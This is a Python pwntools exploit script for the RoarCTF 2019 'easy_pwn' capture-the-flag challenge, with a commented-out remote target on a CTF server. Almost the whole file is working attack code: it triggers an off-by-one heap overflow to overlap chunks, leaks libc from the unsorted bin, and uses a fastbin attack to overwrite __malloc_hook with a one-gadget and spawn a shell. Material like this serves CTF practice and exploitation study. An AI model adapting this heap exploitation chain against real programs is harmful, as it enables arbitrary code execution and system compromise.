#-*- encoding: utf-8 -*- 
from pwn import *
context.binary = './roarctf_2019_easy_pwn'
context.log_level = 'debug'
context.timeout = None
elf = context.binary

def dbg():
	raw_input()

def menu(ch):
	p.sendlineafter('choice: ', str(ch))

def add(size):
	menu(1)
	p.sendlineafter('size: ', str(size))

def edit(idx, size, content):
	menu(2)
	p.sendlineafter('index: ', str(idx))
	p.sendlineafter('size: ',str(size))
	p.sendlineafter('content: ', content)

	print "edit %d chunk success" % idx

def free(idx):
	menu(3)
	p.sendlineafter('index: ', str(idx))
	print "free chunk %d success " % idx

def show(idx):
	menu(4)
	p.sendlineafter('index: ', str(idx))


def exploit():
	#unsorted bin leak libc
	add(0x18)
	add(0x38)
	add(0x68)
	add(0x18)

	edit(0, 0x18+10, 'a'*0x18 + '\xb1')
	free(1)
	add(0x30)		#1
	show(2)
	p.recvuntil('content: ')
	main_arena = u64(p.recv(6).ljust(8, '\x00')) - 0x58
	libc.address = main_arena - 0x3c4b20
	__realloc_hook = libc.symbols['__realloc_hook']
	__malloc_hook = libc.symbols['__malloc_hook']
	__free_hook = libc.symbols['__free_hook']
	system = libc.symbols['system']
	gadget = libc.address + 0xf02a4
	print "libc.address ==> " + hex(libc.address)

	add(0x60)		#4 padding the left unsorted bin


	
	#fastbin attack, malloc_hook
	add(0x18)		#5
	add(0x18)		#6
	add(0x68)		#7
	add(0x18)		#8

	#off-by-one, overlappinhg next chunk
	edit(5, 0x18+10, 'a'*0x18 + '\x91')

	free(7)
	free(6)

	add(0x88)		#6

	gdb.attach(p)
	dbg()
	edit(6, 0x28, 'a'*0x18 + p64(0x71) + p64(__malloc_hook-0x23))

	add(0x68)		#7 padding
	add(0x68)		#9

	edit(9, 0x1b, 'a'*0xb + p64(gadget) +  p64(libc.symbols['realloc']+13))
	add(0x88)

	p.interactive()
	p.close()


#0x7f13a9244c58
#_IO_2_1_stdout_
if __name__ == '__main__':

	p = process('./roarctf_2019_easy_pwn')
	#p = remote('node3.buuoj.cn', 28449)
	libc = elf.libc
	exploit()
